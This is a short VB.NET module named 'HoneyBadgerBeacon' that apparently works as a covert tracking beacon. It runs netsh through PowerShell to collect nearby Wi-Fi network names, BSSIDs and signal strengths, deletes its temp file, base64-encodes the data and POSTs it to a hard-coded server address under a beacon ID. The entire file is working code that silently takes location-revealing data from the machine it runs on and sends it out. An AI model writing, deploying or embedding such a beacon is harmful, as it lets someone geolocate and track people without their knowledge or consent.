Imports System.IO

Module HoneyBadgerBeacon
    Sub Main()
        Dim objWSH As New Object
        objWSH = CreateObject("WScript.Shell")

        Dim wifi As String
        wifi = objWSH.Exec("powershell netsh wlan show networks mode=bssid | findstr 'SSID Signal Channel'").StdOut.ReadAll

        Dim objWriter As New System.IO.StreamWriter(Environ("temp") & "\wifidat.txt")
        objWriter.Write(wifi)
        objWriter.Close()

        wifi = objWSH.Exec("powershell Get-Content %TEMP%\wifidat.txt -Encoding UTF8 -Raw").StdOut.ReadAll

        Kill(Environ("temp") & "\wifidat.txt")

        wifi = objWSH.Exec("powershell -Command ""& {[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('" & wifi & "'))}""").StdOut.ReadAll

        Dim objHTTP As New Object
        objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
        objHTTP.Open("POST", "http://172.20.167.116:5000/api/beacon/5a341794-1b48-4926-a1f4-532c083de5ba/VB")
        objHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
        objHTTP.Send("os=windows&data=" & wifi)
    End Sub
End Module